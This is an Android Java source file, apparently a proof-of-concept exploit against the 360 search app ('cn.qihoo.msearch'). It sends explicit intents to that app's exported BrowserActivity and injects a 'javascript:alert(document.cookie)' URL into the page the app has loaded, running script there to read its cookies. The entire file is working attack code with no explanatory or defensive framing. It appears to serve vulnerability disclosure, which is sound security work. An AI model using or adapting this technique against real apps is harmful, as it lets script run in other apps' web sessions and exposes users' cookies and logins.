package com.qihoo.poc;

import android.os.Bundle;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.view.Menu;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//        setContentView(R.layout.activity_main);
        test360search();
    }

    public void test360search(){
    	Intent i = new Intent(); 
    	ComponentName comp = new ComponentName( 
    	"cn.qihoo.msearch", 
    	"cn.qihoo.msearch.activity.BrowserActivity"); 
    	i.setComponent(comp);
    	i.putExtra("url", "http://www.baidu.com");
    	startActivity(i);
    	try {
    	Thread.sleep(5000);
    	}
    	catch (Exception e) {}
    	i.putExtra("com.android.browser.application_id", "cn.qihoo.msearch");
    	i.addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
    	i.putExtra("url","javascript:alert(document.cookie)");
    	startActivity(i);
    	}
    
}
